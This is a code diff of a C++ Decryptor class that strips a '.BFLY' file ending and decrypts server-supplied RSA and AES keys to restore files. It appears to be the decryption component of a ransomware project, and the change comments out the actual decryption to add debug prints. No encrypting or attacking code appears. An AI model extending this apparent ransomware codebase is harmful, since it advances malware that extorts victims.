@@ -42,19 +42,10 @@ void Decryptor::invokeDir(const std::string &path)
 
     if (aesk.empty() or aesiv.empty())
     {
+        std::cout << "ERROR" << std::endl;
         LOG_ERROR("Decrypted AESKey or AESIV is empty!")
         return;
     }
-
-    /*
-    try
-    {
-        _aesKeyDatabase = std::unique_ptr<AESKeyDatabase>(new AESKeyDatabase(_aesKeyDbFilepath));
-    } catch (SQLDatabaseException &e)
-    {
-        LOG_ERROR("Error: " << e.what());
-    }
-    */
 
     auto files = DirectoryIterator::getAllFiles(path);
     for (auto &file: files)
@@ -62,10 +53,11 @@ void Decryptor::invokeDir(const std::string &path)
         LOG_TRACE("FILE: " << file);
         std::string filepath = file.string();
         removeBFLYEnding(filepath);
-        decryptFileWithAES(filepath, aesk, aesiv);
+        std::cout << "File: " << file << std::endl;
+        //decryptFileWithAES(filepath, aesk, aesiv);
     }
 
-    removeDecryptedFiles();
+    //removeDecryptedFiles();
 }
 
 std::string Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile)
@@ -93,7 +85,6 @@ std::string Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, con
 
 std::string Decryptor::decryptAESKeyPair(const std::string &aesKeyFile)
 {
-
     _rsaDecryptorAESKey = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));
 
     std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents(aesKeyFile);
@@ -108,6 +99,7 @@ std::string Decryptor::decryptAESKeyPair(const std::string &aesKeyFile)
 
     } catch (RSADecryptionException &e)
     {
+        std::cout << e.what() << std::endl;
         LOG_ERROR(e.what());
     }
 
